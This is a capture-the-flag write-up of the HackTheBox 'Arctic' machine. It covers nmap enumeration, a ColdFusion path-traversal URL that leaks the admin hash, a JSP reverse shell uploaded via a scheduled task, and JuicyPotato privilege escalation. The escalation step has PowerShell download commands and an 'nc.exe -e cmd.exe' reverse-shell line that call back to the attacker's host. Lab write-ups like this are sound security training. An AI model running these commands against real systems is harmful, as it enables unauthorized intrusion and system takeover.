---
title: HackTheBox - Arctic
description: Arctic is an easy Windows machine that involves straightforward exploitation with some minor challenges. The process begins by troubleshooting the web server to identify the correct exploit. Initial access can be gained either through an unauthenticated file upload in Adobe `ColdFusion`. Once a shell is obtained, privilege escalation is achieved using the MS10-059 exploit. 
date: 2024-08-20 09:00:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Easy, Windows]
image:
  path: /assets/img/headers/htb_arctic.webp
---

## Enumeration

Getting started by adding Machine IP to `/etc/hosts` as **arctic.htb**. 

### Nmap

Starting Basic nmap scan.

```console
$ sudo nmap -p- -T5 -Pn arctic.htb              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-11 13:25 IST
Nmap scan report for arctic.htb (10.10.10.11)
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 206.96 seconds

$ sudo nmap -p135,8500,49154 -sC -sV -O -T5 arctic.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-11 13:35 IST
Nmap scan report for arctic.htb (10.10.10.11)
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|Vista|8.1 (90%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (88%), Microsoft Windows 7 or Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 or Windows 8.1 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.47 seconds
```


### ColdFusion

I found a web application server on port 8500.  I had to be really patient to work with this app as the site is too slow.
+ http://arctic.htb:8500/


![Arctic](/assets/img/htb_arctic/IMG-HTB-Arctic.png)

![Arctic](/assets/img/htb_arctic/IMG-HTB-Arctic-1.png)

A quick google search gave a site which explained about all things about ColdFusion hacking.
+ https://nets.ec/Coldfusion_hacking

Here is the URL to spill the Hash.

[http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en](http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en)

![Arctic](/assets/img/htb_arctic/IMG-HTB-Arctic-2.png)

I found some hash. I could check if this hash is cracked in crackstation. and, it is already found cracked there.
+ `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03`


### crackstation

| Hash                                     | Type | Result   |   |   |
|------------------------------------------|------|----------|---|---|
| 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 | sha1 | happyday |   |   |

I could login to the app now with creds as admin.

## Foothold

### JSP Reverse Shell

Home Page of ColdFusion after Logging in.

![Arctic](/assets/img/htb_arctic/IMG-HTB-Arctic-3.png)

If we search through the website, we can see a page where we could add tasks and trigger them. We could use JSP reverse shell, upload it here and use it.

As JSP reverse shells are available in Kali linux, I have hosted it using python's http server.

```console
$ cp /usr/share/webshells/jsp/jsp-reverse.jsp ~/transfer
$ python -m http.server
```

`C:\ColdFusion8\wwwroot\CFIDE` will be the root of the uploaded files. so I appended file name to the root text and added it to **File** value.

![Arctic](/assets/img/htb_arctic/IMG-HTB-Arctic-4.png)

**submit** and run the task.

![Arctic](/assets/img/htb_arctic/IMG-HTB-Arctic-6.png)

Uploaded shell can be found here:
+ `http://10.10.10.11:8500/CFIDE/jsp-reverse.jsp` 

![Arctic](/assets/img/htb_arctic/IMG-HTB-Arctic-5.png)
_viewing JSP page after upload and running task_


i have started a netcat listener and got a connect back.

```console
$ rlwrap nc -lnvp 4444         
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.11] 50785
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```


We are user `tolis` and we can read **user.txt** .
+ `C:\Users\tolis\Desktop\user.txt`

## Privilege Escalation

Checking `tolis` privileges. 

```console
C:\Users\tolis\Desktop>whoami /priv 
whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


I used juicypotato to escalate. or use python exploit suggestor like here [posts/hackthebox-devel/#privilege-escalation](https://dineshkoravi.github.io/posts/hackthebox-devel/#privilege-escalation)

```console
$ powershell "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.16.3:8000/JuicyPotato.exe', 'C:\Users\Public\Downloads\JuicyPotato.exe')" -bypass executionpolicy

$ powershell "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.16.3:8000/nc.exe', 'C:\Users\Public\Downloads\nc.exe')" -bypass executionpolicy

$ echo C:\Users\Public\Downloads\nc.exe -e cmd.exe 10.10.16.3 9001 > priv.bat

$ JuicyPotato.exe -p C:\Users\Public\Downloads\priv1.bat -l 9001 -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}

# Get CLSIDs with scripts or from github.
# https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
# used BITS clsid
```

we have role of `nt authority\system` now.
```console
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
```
